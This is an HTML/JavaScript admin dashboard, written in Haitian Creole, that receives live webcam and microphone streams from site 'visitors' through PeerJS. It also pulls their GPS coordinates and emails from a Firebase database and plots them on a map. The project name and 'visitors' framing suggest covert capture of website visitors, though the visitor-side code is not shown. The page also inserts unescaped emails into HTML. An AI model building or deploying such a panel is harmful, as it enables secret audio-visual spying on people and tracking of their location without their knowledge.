<!DOCTYPE html>
<html lang="ht">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin — Jesyon</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0d0d0d; color: white;
    font-family: system-ui, sans-serif;
    padding: 15px; min-height: 100vh;
  }
  h1 { text-align: center; color: #00cc66; font-size: 1.3rem; margin-bottom: 5px; }
  #status { text-align: center; color: #ccc; font-size: 13px; margin-bottom: 15px; }

  .tabs { display: flex; gap: 5px; max-width: 600px; margin: 0 auto 15px; }
  .tab {
    flex: 1; padding: 12px; background: #1c1c1c;
    color: #ccc; border: 1px solid #333;
    border-radius: 8px; cursor: pointer; font-size: 13px;
  }
  .tab.active { background: #00cc66; color: white; border-color: #00cc66; }

  #videoGrid {
    display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 12px; max-width: 1200px; margin: 0 auto;
  }
  .video-card {
    background: #1c1c1c; border-radius: 12px; padding: 10px;
    text-align: center; border: 1px solid #333; position: relative;
  }
  .video-card video {
    width: 100%; border-radius: 8px; background: #000;
    display: block; min-height: 180px;
  }
  .video-card p { margin-top: 8px; font-size: 12px; color: #999; }
  .video-card .sound-toggle {
    width: 100%; margin-top: 6px; padding: 8px;
    background: #2196f3; color: white; border: none;
    border-radius: 8px; cursor: pointer;
    font-size: 12px; font-weight: bold;
  }
  .video-card .sound-toggle.off { background: #cc3333; }
  .live-dot {
    position: absolute; top: 18px; left: 18px;
    width: 10px; height: 10px; border-radius: 50%;
    background: #ff3333; animation: pulse 1s infinite; z-index: 5;
  }
  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }

  #map {
    height: 60vh; max-width: 900px;
    margin: 0 auto 15px; border-radius: 12px;
    border: 1px solid #333; z-index: 1;
  }
  .locations-list {
    max-width: 900px; margin: 0 auto;
    display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
    gap: 8px;
  }
  .loc-card {
    background: #1c1c1c; border: 1px solid #333;
    border-radius: 10px; padding: 12px; font-size: 12px;
  }
  .loc-card .name { color: #00cc66; font-weight: bold; margin-bottom: 5px; }
  .loc-card .info { color: #aaa; font-size: 11px; line-height: 1.5; }

  .empty { text-align: center; color: #666; padding: 40px; font-size: 13px; grid-column: 1 / -1; }
  .hidden { display: none !important; }
</style>
</head>
<body>

  <h1>🎥 Admin — Jesyon</h1>
  <p id="status">⏳ Ap konekte...</p>

  <div class="tabs">
    <button class="tab active" id="tabVisitors">👁 Visitors</button>
    <button class="tab" id="tabMap">🗺️ Kat</button>
  </div>

  <div id="visitorsView">
    <div id="videoGrid">
      <div class="empty">Ap tann visitor yo konekte...</div>
    </div>
  </div>

  <div id="mapView" class="hidden">
    <div id="map"></div>
    <div class="locations-list" id="locationsList">
      <div class="empty">Pa gen visitors lokalize</div>
    </div>
  </div>

<script src="https://unpkg.com/peerjs@1.5.0/dist/peerjs.min.js"></script>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<script>
/* ============================================
   FIREBASE
   ============================================ */
const firebaseConfig = {
  apiKey: "AIzaSyBLIrjwXzJJKIWGbqblXXBop7DnfmobKH0",
  authDomain: "style-sportif.firebaseapp.com",
  databaseURL: "https://style-sportif-default-rtdb.firebaseio.com",
  projectId: "style-sportif",
  storageBucket: "style-sportif.firebasestorage.app",
  messagingSenderId: "210989893646",
  appId: "1:210989893646:web:1c8ae17b9473a75192145f"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

/* ============================================
   TABS
   ============================================ */
const tabVisitors  = document.getElementById("tabVisitors");
const tabMap       = document.getElementById("tabMap");
const visitorsView = document.getElementById("visitorsView");
const mapView      = document.getElementById("mapView");

tabVisitors.onclick = () => {
  tabVisitors.classList.add("active");
  tabMap.classList.remove("active");
  visitorsView.classList.remove("hidden");
  mapView.classList.add("hidden");
};

tabMap.onclick = () => {
  tabMap.classList.add("active");
  tabVisitors.classList.remove("active");
  mapView.classList.remove("hidden");
  visitorsView.classList.add("hidden");
  setTimeout(() => { if (map) map.invalidateSize(); }, 100);
};

/* ============================================
   KAT
   ============================================ */
let map = null;
let markers = {};

function initMap() {
  map = L.map('map').setView([18.5392, -72.3360], 10);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap',
    maxZoom: 19
  }).addTo(map);
}

/* ============================================
   PEERJS
   ============================================ */
const ADMIN_ID = "admin-piyayy-2026-v2";
const grid = document.getElementById("videoGrid");
const status = document.getElementById("status");
const visitors = {};

const ICE_CONFIG = {
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" },
    { 
      urls: "turn:openrelay.metered.ca:80",
      username: "openrelayproject",
      credential: "openrelayproject"
    },
    { 
      urls: "turn:openrelay.metered.ca:443",
      username: "openrelayproject",
      credential: "openrelayproject"
    },
    { 
      urls: "turn:openrelay.metered.ca:443?transport=tcp",
      username: "openrelayproject",
      credential: "openrelayproject"
    }
  ]
};

let peer = null;

function connectPeer() {
  peer = new Peer(ADMIN_ID, { config: ICE_CONFIG, debug: 1 });

  peer.on("open", (id) => {
    console.log("✅ Admin ID:", id);
    status.innerText = "✅ Admin konekte. Ap tann visitors...";
    const empty = grid.querySelector(".empty");
    if (empty) empty.remove();
  });

  peer.on("call", handleCall);

  peer.on("error", (err) => {
    console.warn("PeerJS erè:", err);
    if (err.type === "unavailable-id") {
      status.innerText = "❌ ID deja itilize. Ap eseye ankò...";
      setTimeout(connectPeer, 3000);
      return;
    }
    status.innerText = "❌ Erè: " + err.type;
  });

  peer.on("disconnected", () => {
    status.innerText = "⚠️ Koneksyon pèdi";
    setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
  });
}

function handleCall(call) {
  const visitorId = call.peer;
  console.log("📞 Visitor konekte:", visitorId);

  if (visitors[visitorId]) {
    try { visitors[visitorId].call.close(); } catch (e) {}
    if (visitors[visitorId].card) visitors[visitorId].card.remove();
    delete visitors[visitorId];
  }

  call.answer();

  const card = document.createElement("div");
  card.className = "video-card";
  card.dataset.visitorId = visitorId;

  const dot = document.createElement("div");
  dot.className = "live-dot";

  const video = document.createElement("video");
  video.autoplay = true;
  video.playsInline = true;
  video.muted = true;

  const label = document.createElement("p");
  label.innerText = "👤 " + visitorId;

  const soundBtn = document.createElement("button");
  soundBtn.className = "sound-toggle";
  soundBtn.innerText = "🔊 Tande son";
  soundBtn.onclick = () => {
    video.muted = !video.muted;
    if (video.muted) {
      soundBtn.innerText = "🔊 Tande son";
      soundBtn.classList.remove("off");
    } else {
      soundBtn.innerText = "🔇 Koupe son";
      soundBtn.classList.add("off");
      video.play().catch(e => console.warn("play err:", e));
    }
  };

  card.appendChild(dot);
  card.appendChild(video);
  card.appendChild(label);
  card.appendChild(soundBtn);
  grid.appendChild(card);

  visitors[visitorId] = { call, video, card };

  call.on("stream", (remoteStream) => {
    console.log("🎬 Stream rive:", visitorId);
    video.srcObject = remoteStream;
    video.play().catch(e => console.warn("play err:", e));
  });

  call.on("close", () => {
    console.log("📴 Call close:", visitorId);
    cleanup(visitorId);
  });

  call.on("error", (e) => {
    console.warn("Call erè:", e);
    cleanup(visitorId);
  });

  updateStatus();
}

function cleanup(id) {
  if (!visitors[id]) return;
  try { visitors[id].call.close(); } catch (e) {}
  if (visitors[id].card) visitors[id].card.remove();
  delete visitors[id];
  updateStatus();
}

function updateStatus() {
  const count = Object.keys(visitors).length;
  status.innerText = count > 0
    ? `🟢 ${count} visitor konekte`
    : "✅ Admin konekte. Ap tann visitors...";

  if (count > 0) {
    const empty = grid.querySelector(".empty");
    if (empty) empty.remove();
  } else if (!grid.querySelector(".empty")) {
    const empty = document.createElement("div");
    empty.className = "empty";
    empty.innerText = "Ap tann visitor yo konekte...";
    grid.appendChild(empty);
  }
}

/* ============================================
   LOKASYON
   ============================================ */
const locationsList = document.getElementById("locationsList");

db.ref("locations").on("value", (snapshot) => {
  const data = snapshot.val();

  Object.values(markers).forEach(m => { if (map) map.removeLayer(m); });
  markers = {};
  locationsList.innerHTML = "";

  if (!data || Object.keys(data).length === 0) {
    locationsList.innerHTML = '<div class="empty">Pa gen visitors lokalize</div>';
    return;
  }

  Object.entries(data).forEach(([id, loc]) => {
    const pos = [loc.lat, loc.lon];
    const email = loc.email || "Anonim";

    if (map) {
      const m = L.marker(pos).addTo(map);
      m.bindPopup(`<b>${email}</b><br>${Math.round(loc.acc)}m`);
      markers[id] = m;
    }

    const div = document.createElement("div");
    div.className = "loc-card";
    div.innerHTML = `
      <div class="name">👤 ${email}</div>
      <div class="info">
        📍 ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}<br>
        🎯 ${Math.round(loc.acc)} m<br>
        🕐 ${new Date(loc.time).toLocaleTimeString()}
      </div>
    `;
    locationsList.appendChild(div);
  });
});

/* ============================================
   KÒMANSE
   ============================================ */
initMap();
connectPeer();
</script>
</body>
</html>
